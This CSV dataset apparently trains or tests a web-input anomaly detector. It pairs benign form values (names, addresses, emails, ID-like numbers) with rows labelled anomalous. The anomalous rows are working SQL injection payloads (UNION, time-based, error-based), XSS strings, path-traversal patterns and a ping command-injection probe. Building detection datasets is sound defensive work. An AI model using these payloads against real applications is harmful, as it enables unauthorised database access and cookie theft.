payload,length,attack_type,label
0222583632895914,16,norm,norm
"-6186' in boolean mode) union all select 2990,2990,2990#",56,sqli,anom
"-2964"")) order by 1--",21,sqli,anom
/.//././/././/././/././/././/./{file},37,path-traversal,anom
car52lit7,9,norm,norm
9162334723875086,16,norm,norm
1'||(select 'ilkr' from dual where 9296=9296;select case when 7717=7717 then 1 else null end--,94,sqli,anom
"1%' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='",163,sqli,anom
"1%"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""",118,sqli,anom
1'));begin dbms_lock.sleep(5); end--,36,sqli,anom
9797161679933006,16,norm,norm
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""%""=""",102,sqli,anom
"c/ quintana 132, 13?h",21,norm,norm
romn,4,norm,norm
intern5r,8,norm,norm
1' where 2673=2673;select (case when (2716=8138) then 2716 else 2716*(select 2716 from mysql.db) end)#,102,sqli,anom
jarvis-wassmann@classroommanager.pe,35,norm,norm
"1) as ezje where 5234=5234 and make_set(8403=8403,8899)--",57,sqli,anom
semicopado,10,norm,norm
iberio,6,norm,norm
brookes,7,norm,norm
57317186j,9,norm,norm
"comun 150,",10,norm,norm
"1%') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",113,sqli,anom
roni,4,norm,norm
arbizu,6,norm,norm
escudern,8,norm,norm
"1%'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",50,sqli,anom
70132648j,9,norm,norm
tahsin,6,norm,norm
56926815k,9,norm,norm
"1' in boolean mode) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",159,sqli,anom
izzi barnils,12,norm,norm
villanueva de huerva,20,norm,norm
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""ghdr"" like ""ghdr",119,sqli,anom
"-1150') as hdby where 4032=4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",100,sqli,anom
"-7553%"" or 3571=2886",20,sqli,anom
95944263q,9,norm,norm
<img id=xss src=javascript:alert('xss')>,40,xss,anom
08394,5,norm,norm
7987,4,norm,norm
rob,3,norm,norm
keng@glutenfreespain.lb,23,norm,norm
junmeng,7,norm,norm
1%') and (select * from (select(sleep(5)))gcrr)#,48,sqli,anom
34878590x,9,norm,norm
cunillera penades,17,norm,norm
"azorin, 167",11,norm,norm
sharron,7,norm,norm
5849964117227978,16,norm,norm
"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",73,sqli,anom
raush.runyon@discoteatre.fk,27,norm,norm
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",90,sqli,anom
intuitivo,9,norm,norm
prewitt,7,norm,norm
besime,6,norm,norm
"1') where 6774=6774 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",117,sqli,anom
"1"") where 6679=6679 rlike sleep(5)#",35,sqli,anom
francoeu,8,norm,norm
porteril,8,norm,norm
1 where 6494=6494 and 8463=2760,31,sqli,anom
51518827t,9,norm,norm
1')) waitfor delay '0:0:5' and (('jcfe'='jcfe,45,sqli,anom
feliu,5,norm,norm
valdivieso,10,norm,norm
32493489d,9,norm,norm
yuvia,5,norm,norm
"-9856"" union all select 9753--",30,sqli,anom
"make_set(2672=2672,5440)",24,sqli,anom
saciedad,8,norm,norm
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",97,sqli,anom
trujillo fornalino,18,norm,norm
zeisler,7,norm,norm
romana,6,norm,norm
desmedro,8,norm,norm
efran,5,norm,norm
vikram,6,norm,norm
"-1964') as ihsp where 6379=6379 or elt(6945=6165,6165)--",56,sqli,anom
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""buwe""=""buwe",119,sqli,anom
garrafe de toro,15,norm,norm
cigudosa,8,norm,norm
18301326l,9,norm,norm
"1%"");select benchmark(5000000,md5(0x4c4d6142)) and (""%""=""",57,sqli,anom
yoshiyam,8,norm,norm
1);select sleep(5) and (4863=4863,33,sqli,anom
4713791605534130,16,norm,norm
"1 where 7412=7412 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",125,sqli,anom
"1 where 7254=7254;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",134,sqli,anom
ramadoss,8,norm,norm
"c/ academia, 59, 3?g",20,norm,norm
da-1m1n,7,norm,norm
"-1634%' union all select 5937,5937,5937,5937--",46,sqli,anom
"1) where 7425=7425 union all select null,null,null,null,null,null,null,null,null,null--",87,sqli,anom
1e9.l62r2do6,12,norm,norm
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('rzjf'='rzjf",140,sqli,anom
"1"") and (select * from (select(sleep(5)))fzno) and (""zvew"" like ""zvew",69,sqli,anom
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""gydr"" like ""gydr",110,sqli,anom
52438346w,9,norm,norm
7360017663684858,16,norm,norm
ping.exe -n 31 127.0.0.1,24,cmdi,anom
dion0843co,10,norm,norm
"1"") where 3943=3943 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",95,sqli,anom
sadoyama,8,norm,norm
27001,5,norm,norm
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",116,sqli,anom
"escritor miguel delibes 0, 7?b",30,norm,norm
"""test""></form><button form=""test"" formaction=""javascript:alert(1)"">x</button>",77,xss,anom
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# utdm",147,sqli,anom
dueppen,7,norm,norm
membro,6,norm,norm
ad28rsari!a,11,norm,norm
"calle francisco gervas, 174, 9h",31,norm,norm
e00u4rda2,9,norm,norm
"1%"");(select * from (select(sleep(5)))acdk)#",44,sqli,anom
or5i6or6i686,12,norm,norm
"1) and 3824=benchmark(5000000,md5(0x76555642)) and (6786=6786",61,sqli,anom
"1') or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",101,sqli,anom
ulc0r81a,8,norm,norm
">""<script>a=/crosssitescripting/ document.cookie=true;</script>",63,xss,anom
16300,5,norm,norm
rosselot azcona,15,norm,norm
straths@campanasextractoras.vn,30,norm,norm
03180,5,norm,norm
"1"") where 5298=5298 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",220,sqli,anom
"1'||(select 'akye' where 9242=9242 union all select null,null,null,null,null,null#",82,sqli,anom
schwuchow9@viajessolomujeres.bj,31,norm,norm
atef,4,norm,norm
"1%"")) waitfor delay '0:0:5'--",29,sqli,anom
ehrenfri,8,norm,norm
"1"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli,anom
1' rlike sleep(5)#,18,sqli,anom
banerjee6@getgold.ec,20,norm,norm
84oc4n1r,8,norm,norm
jezabel,7,norm,norm
"1') union all select null,null,null,null#",41,sqli,anom
baretto0@drae2.tk,17,norm,norm
fabiela,7,norm,norm
43391,5,norm,norm
"1' in boolean mode) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)#",94,sqli,anom
1059928902417697,16,norm,norm
desempulgadura,14,norm,norm
"calle robert gerhard, s/n 6c",28,norm,norm
pon38ra1l9,10,norm,norm
carbunclo,9,norm,norm
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",158,sqli,anom
"-8106%"") union all select 2051,2051,2051,2051,2051,2051#",56,sqli,anom
"1%"" union all select null--",27,sqli,anom
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",60,xss,anom
"plza. magallanes, 50",20,norm,norm
transbordar,11,norm,norm
-1662 where 1119=1119 or (8459=8459)*4906--,43,sqli,anom
"1' where 4185=4185 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",110,sqli,anom
kawas kercooff,14,norm,norm
42583172y,9,norm,norm
"1) where 5615=5615 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",222,sqli,anom
"1' in boolean mode) union all select null,null,null,null,null,null--",68,sqli,anom
levitin,7,norm,norm
10630,5,norm,norm
"campello, el",12,norm,norm
1 and 9122=4153# nxcv,21,sqli,anom
"-6593"") union all select 6216,6216,6216,6216,6216,6216,6216#",60,sqli,anom
27619,5,norm,norm
santa,5,norm,norm
cerinza,7,norm,norm
watanabe,8,norm,norm
"-3637"" or (8459=8459)*4906",26,sqli,anom
"1)) as rhwg where 8843=8843;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",111,sqli,anom
vila,4,norm,norm
-7277))) order by 1#,20,sqli,anom
1' in boolean mode) rlike (select (case when (1343=1595) then 1 else 0x28 end))#,80,sqli,anom
haim.gorvin@didacramirez.tl,27,norm,norm
ddima,5,norm,norm
sincopar,8,norm,norm
ossie,5,norm,norm
baheya,6,norm,norm
id=xss src= <img 6;avascript:alert('xss')>,42,xss,anom
1) and (select * from (select(sleep(5)))gcrr)#,46,sqli,anom
santa catalina 81,17,norm,norm
55658066k,9,norm,norm
dra2atizar,10,norm,norm
-1021) as erjh where 7845=7845 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,234,sqli,anom
98993276b,9,norm,norm
1648,4,norm,norm
marla,5,norm,norm
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'ggcm' like 'ggcm",128,sqli,anom
ad0inist1ador9,14,norm,norm
rummel@acch-portugal.ni,23,norm,norm
"-6020'+(select isrz where 2489=2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",94,sqli,anom
"-4960 union all select 4031,4031#",33,sqli,anom
50140,5,norm,norm
"-9054"") as rgyu where 3792=3792 order by 1--",44,sqli,anom
1' in boolean mode) waitfor delay '0:0:5'--,43,sqli,anom
"1"") as xaye where 5343=5343 and 4355=7475#",42,sqli,anom
"-9015%"") union all select 6948,6948--",37,sqli,anom
"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw",175,sqli,anom
"-4580"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""dbhb""=""dbhb",218,sqli,anom
"-3475"" or elt(5532=4242,4242)",29,sqli,anom
"1) as jvuo where 6859=6859 union all select null,null,null,null,null,null,null#",79,sqli,anom
"1' and elt(1533=5695,5695) and 'ycgi'='ycgi",43,sqli,anom
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""text"" like ""text",90,sqli,anom
46773841y,9,norm,norm
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""znzb"" like ""znzb",216,sqli,anom
76pelacin,9,norm,norm
garladora,9,norm,norm
/0x2e0x2e0x5c{file},19,path-traversal,anom
"escritor nicolas del paso, 95",29,norm,norm
4658,4,norm,norm
"1'||(select 'uqbj' from dual where 6736=6736 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",182,sqli,anom
"1"")) as nncz where 2331=2331;select case when 6420=7941 then 1 else null end--",78,sqli,anom
08776,5,norm,norm
4233,4,norm,norm
"-1064' or make_set(6439=2937,2937) and 'qojd'='qojd",51,sqli,anom
alma,4,norm,norm
1' rlike sleep(5) and 'ojqz' like 'ojqz,39,sqli,anom
barber,6,norm,norm
guaita zaragoza,15,norm,norm
cerceda,7,norm,norm
caleb,5,norm,norm
"calle mestre chapi 48,",22,norm,norm
161que,6,norm,norm
concursado,10,norm,norm
0052422482512057,16,norm,norm
"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",170,sqli,anom
eric3@familiamarino.sh,22,norm,norm
12188295c,9,norm,norm
1' in boolean mode) and sleep(5)#,33,sqli,anom
07077546d,9,norm,norm
"1%') and 8635=(select count(*) from generate_series(1,5000000))--",65,sqli,anom
riudavet,8,norm,norm
ruick_heasley4@18horas.ro,25,norm,norm
1'||(select 'glyc' from dual where 4058=4058;(select * from (select(sleep(5)))srmq))||',87,sqli,anom
xavier,6,norm,norm
1')) as mqnv where 9831=9831;select (case when (4994=1572) then 4994 else 4994*(select 4994 from mysql.db) end)#,112,sqli,anom
"montblanc 86, 12?d",18,norm,norm
"1"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""qpzj"" like ""qpzj",101,sqli,anom
/iiiiiii{file},14,path-traversal,anom
sigenza,7,norm,norm
1' in boolean mode) union all select null#,42,sqli,anom
"-8988"")) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""dyxh"" like ""dyxh",227,sqli,anom
"1%"" union all select null,null,null--",37,sqli,anom
"1) where 7588=7588 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,sqli,anom
epnimo,6,norm,norm
5257931647701652,16,norm,norm
19135,5,norm,norm
barceo,6,norm,norm
"1) where 8734=8734 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",109,sqli,anom
9159,4,norm,norm
tetona,6,norm,norm
25132,5,norm,norm
acrianzada,10,norm,norm
mo8os7,6,norm,norm
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('lkun' like 'lkun",156,sqli,anom
1'+(select 'czpg' where 6627=6627 and 2006=2006,47,sqli,anom
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""arqb"" like ""arqb",223,sqli,anom
"1)) as nlzg where 1482=1482 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",159,sqli,anom
"1%');call regexp_substring(repeat(right(char(2385),0),500000000),null)--",72,sqli,anom
1))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((5368=5368,224,sqli,anom
108,3,norm,norm
browne,6,norm,norm
e4te9ad2,8,norm,norm
teresilda,9,norm,norm
gaetano,7,norm,norm
ci2586ta,8,norm,norm
intima,6,norm,norm
19244,5,norm,norm
72219452g,9,norm,norm
rocco-misaki@soybueno.nz,24,norm,norm
17773,5,norm,norm
"-3758')) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",67,sqli,anom
calle junco,11,norm,norm
"paratge lila 30, 10?c",21,norm,norm
18126,5,norm,norm
5155735586136937,16,norm,norm
"1%')) or elt(5873=5873,sleep(5))#",33,sqli,anom
6351981280005819,16,norm,norm
"1""));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((""eevk""=""eevk",89,sqli,anom
26223,5,norm,norm
antiseps$ia,11,norm,norm
"-4772))) union all select 3879,3879,3879,3879,3879--",52,sqli,anom
08181,5,norm,norm
gruart ola,10,norm,norm
maestro vitoria 10,18,norm,norm
rozsabegyi.kasker@mirata.ls,27,norm,norm
masegosa,8,norm,norm
"1"" and elt(4249=4249,7259) and ""kgtz"" like ""kgtz",48,sqli,anom
3182733189788703,16,norm,norm
"1) as idvt where 3490=3490 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",125,sqli,anom
9136,4,norm,norm
"1'||(select 'zoqo' from dual where 2063=2063;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",132,sqli,anom
"1"") and make_set(4539=6401,6401) and (""kglx""=""kglx",50,sqli,anom
"1') as dajk where 1452=1452 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",118,sqli,anom
bojanic-gidra-tolan@elcarritodelacompra.ma,42,norm,norm
"1))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((2997=2997",160,sqli,anom
tonny,5,norm,norm
"c/ la figuera 63,",17,norm,norm
85089975a,9,norm,norm
"-6220' union all select 1462,1462#",34,sqli,anom
baxie,5,norm,norm
14399392n,9,norm,norm
garv,4,norm,norm
hartford,8,norm,norm
wacker,6,norm,norm
mehboob,7,norm,norm
"-9145') as xyya where 8950=8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",90,sqli,anom
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../{file},1043,path-traversal,anom
1'||(select 'jmhb' where 1794=1794 or 4240=(select 4240 from pg_sleep(5))--,75,sqli,anom
"1%""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",102,sqli,anom
espa7t4ro,9,norm,norm
baos de ebro/maueta,19,norm,norm
audadora,8,norm,norm
1')));select pg_sleep(5) and ((('xobx'='xobx,44,sqli,anom
1%')));begin user_lock.sleep(5); end--,38,sqli,anom
"-1351"" where 6968=6968 or 5684=8582",35,sqli,anom
93234482a,9,norm,norm
63s4r1a1t2,10,norm,norm
bangert,7,norm,norm
septimio,8,norm,norm
"1%' and elt(7619=1489,1489) and '%'='",37,sqli,anom
"av. italia, 66, 4-a",19,norm,norm
"c/ paseillo 153,",16,norm,norm
tacuara,7,norm,norm
668,3,norm,norm
12199825g,9,norm,norm
ivars d'urgell,14,norm,norm
7802564599685177,16,norm,norm
sikander,8,norm,norm
1'));begin user_lock.sleep(5); end and (('zlsq'='zlsq,53,sqli,anom
"1' where 1895=1895 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",116,sqli,anom
"1"") where 5358=5358;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",107,sqli,anom
tharsis s/n 11?c,16,norm,norm
xtiva,5,norm,norm
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",70,sqli,anom
belva,5,norm,norm
irn0co,6,norm,norm
blakley@asyra.ao,16,norm,norm
37291,5,norm,norm
zambrana,8,norm,norm
tuajeva@aeag.ir,15,norm,norm
burg,4,norm,norm
1));select case when 7717=7717 then 1 else null end--,53,sqli,anom
